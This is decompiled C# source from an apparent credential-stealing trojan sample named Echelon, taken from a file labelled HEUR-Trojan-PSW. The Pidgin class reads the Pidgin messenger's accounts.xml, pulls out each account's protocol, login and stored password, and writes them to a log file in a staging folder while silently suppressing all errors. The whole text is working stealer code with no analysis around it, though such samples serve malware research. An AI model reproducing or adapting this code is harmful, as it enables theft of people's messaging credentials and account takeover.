// Decompiled with JetBrains decompiler
// Type: Echelon.Pidgin
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.IO;
using System.Text;
using System.Xml;

namespace Echelon
{
  internal class Pidgin
  {
    public static int PidginCount = 0;
    public static int PidginAkks = 0;
    private static readonly string PidginPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".purple\\accounts.xml");
    private static StringBuilder SBTwo = new StringBuilder();

    public static void Start(string directorypath)
    {
      if (!File.Exists(Pidgin.PidginPath))
        return;
      Directory.CreateDirectory(directorypath + "\\Jabber\\Pidgin\\");
      Pidgin.GetDataPidgin(Pidgin.PidginPath, directorypath + "\\Jabber\\Pidgin\\Pidgin.log");
    }

    public static void GetDataPidgin(string PathPn, string SaveFile)
    {
      try
      {
        if (!File.Exists(PathPn))
          return;
        try
        {
          XmlDocument xmlDocument = new XmlDocument();
          xmlDocument.Load((XmlReader) new XmlTextReader(PathPn));
          foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes)
          {
            string innerText1 = childNode.ChildNodes[0].InnerText;
            string innerText2 = childNode.ChildNodes[1].InnerText;
            string innerText3 = childNode.ChildNodes[2].InnerText;
            if (!string.IsNullOrEmpty(innerText1))
            {
              if (!string.IsNullOrEmpty(innerText2))
              {
                if (!string.IsNullOrEmpty(innerText3))
                {
                  Pidgin.SBTwo.AppendLine("Protocol: " + innerText1);
                  Pidgin.SBTwo.AppendLine("Login: " + innerText2);
                  Pidgin.SBTwo.AppendLine("Password: " + innerText3 + "\r\n");
                  ++Pidgin.PidginAkks;
                  ++Pidgin.PidginCount;
                }
                else
                  break;
              }
              else
                break;
            }
            else
              break;
          }
          if (Pidgin.SBTwo.Length <= 0)
            return;
          try
          {
            File.AppendAllText(SaveFile, Pidgin.SBTwo.ToString());
          }
          catch
          {
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
    }
  }
}
